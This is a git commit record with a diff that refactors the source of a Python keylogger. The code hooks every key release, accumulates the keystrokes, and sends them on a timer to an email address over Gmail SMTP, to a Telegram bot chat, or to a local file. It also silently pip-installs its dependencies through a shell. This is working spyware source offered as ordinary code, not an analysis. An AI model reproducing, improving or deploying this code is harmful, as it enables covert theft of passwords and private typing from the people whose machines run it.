85f37e14af65db6b281257f1b778a726b6539874
Intercrus <squadew@yandex.ru>
2021-11-18 04:05:57 +0300

    Refactoring

--- main.py
+++ main.py
@@ -1,86 +1,77 @@
-import keyboard
-import requests
 import smtplib
 import datetime
-
-from re import fullmatch
-from contracts import contract, new_contract
 from threading import Timer
-from config import SEND_REPORT_EVERY, TELEGRAM_BOT_TOKEN, \
-                   EMAIL, PASSWORD, ADMIN_CHAT_ID
+from config import (SEND_REPORT_EVERY, TELEGRAM_BOT_TOKEN, EMAIL,
+                    PASSWORD, ADMIN_CHAT_ID)
+try:
+    import keyboard
+    import requests
+    from contracts import contract, new_contract
+except ModuleNotFoundError:
+    from subprocess import call
+    call(f"pip install requests keyboard PyContracts", shell=True)
 
 
 @new_contract
 def validationCheckReportMethod(x):
     if x not in ("email", "file", "telegram"):
-        raise ValueError("report_method can only be one of these three:"
+        raise ValueError(f"report_method can only be one of these three:"
                          "email, telegram, file. Unacceptable %s" % x)
 
 
-@new_contract
-def validationCheckEmail(x):  # TODO: replace re with py3-validate-email
-    if not fullmatch(r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b', x):
-        return ValueError("Invalid email")
-
-
 class Keylogger:
-    @contract
     def __init__(self, interval=3600, report_method="file"):
         """
-        :param interval: time interval between reports (in seconds)
-        :param report_method: where to send report
+        :param interval: Time interval between sending reports (in seconds).
+            Default - 3600 seconds (1 hour).
+        :param report_method: Method of sending reports. Default - "file"
+            Three methods supported:
+                1. "file" - reports are saved to a file locally.
+                2. "telegram" - reports are sent via bot to telegram.
+                3. "email" - reports are sent to email.
 
+        :attr log: all pressed keys are recorded here.
+        :attr heading_log: report title. Includes the date and time the
+            report was sent. What it looks like: Keylogger
+                                                 Date: DAYS/MONTHS/YEARS
+                                                 Time: HOURS/MINUTES/SECONDS
+                                                 ===========================
+                                                 self.log content
         :type interval: int,>0
         :type report_method: str,validationCheckReportMethod
         """
         self.interval = interval
         self.report_method = report_method
         self.log = ""
+        self.heading_log = datetime.datetime.now().strftime(
+            "Keylogger\nDate: %d/%m/%Y\nTime: %H:%M:%S\n===================\n"
+        )
 
-    @contract
-    def report_to_email(self, email, password):
+    def report_to_email(self, email, password, text):
         """
-        This method sends reports to the specified email.
-
-        :param email: the name of the email where the logs will be sent
-        :param password: password from email
-
-        :type email: str,validationCheckEmail
-        :type password: str
         """
-        smtp = smtplib.SMTP("", 465)
-        smtp.starttls()
-        smtp.login(email, password)
-        smtp.sendmail(email, email, "Subject: Keylogger\n" + datetime.datetime.now().strftime("Date: %d/%m/%Y\nTime: %H:%M:%S\n----------------\n") + self.log)
-        smtp.quit()
+        server = smtplib.SMTP("smtp.gmail.com", 587)
+        server.starttls()
+        server.login(email, password)
+        server.sendmail(email, email, text)
+        server.quit()
 
-    @contract
-    def report_to_telegram(self, bot_token, chat_id):
+    def report_to_telegram(self, bot_token, chat_id, text):
         """
-        This method sends reports via telegram bot
-
-        :param bot_token: your bot token (get it in @BotFather)
-        :param chat_id: actually your ID (get it in @username_to_id_bot)
-
-        :type bot_token: str
-        :type chat_id: str
         """
         url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
-        request = requests.post(url, data={"chat_id": chat_id, "text": datetime.datetime.now().strftime("Date: %d/%m/%Y\nTime: %H:%M:%S\n----------------\n") + self.log})
+        request = requests.post(url, data={"chat_id": chat_id, "text": text})
         if request.status_code != 200:
             request.raise_for_status()
 
-    def report_to_file(self):
+    def report_to_file(self, text):
         """
-        This method ...
         """
-        with open("text.txt", "w") as file:
-            print(datetime.datetime.now().strftime("Date: %d/%m/%Y\nTime: %H:%M:%S\n----------------\n") + self.log, file=file)
+        with open(f"Report from {datetime.datetime.now()}", "w") as file:
+            print(text, file=file)
 
     def callback(self, event):
         """
-        This method is called when any key is pressed.
-        It tracks the key pressed and writes it to log.
         """
         name = event.name
         if len(name) > 1:
@@ -94,15 +85,16 @@ class Keylogger:
 
     def report(self):
         """
-        This method ...
         """
         if self.log:
             if self.report_method == "email":
-                self.report_to_email(EMAIL, PASSWORD)
+                self.report_to_email(EMAIL, PASSWORD,
+                                     self.heading_log + self.log)
             elif self.report_method == "telegram":
-                self.report_to_telegram(TELEGRAM_BOT_TOKEN, ADMIN_CHAT_ID)
+                self.report_to_telegram(TELEGRAM_BOT_TOKEN, ADMIN_CHAT_ID,
+                                        self.heading_log + self.log)
             elif self.report_method == "file":
-                self.report_to_file()
+                self.report_to_file(self.heading_log + self.log)
         self.log = ""
         schedule = Timer(interval=self.interval, function=self.report)
         schedule.daemon = True
@@ -110,19 +102,12 @@ class Keylogger:
 
     def start(self):
         """
-        This method ...
         """
         keyboard.on_release(callback=self.callback)
         self.report()
         keyboard.wait()
 
 
-def main():
-    """
-    """
-    keylogger = Keylogger(SEND_REPORT_EVERY, "email")
-    keylogger.start()
-
-
 if __name__ == "__main__":
-    main()
+    keylogger = Keylogger(20)
+    keylogger.start()
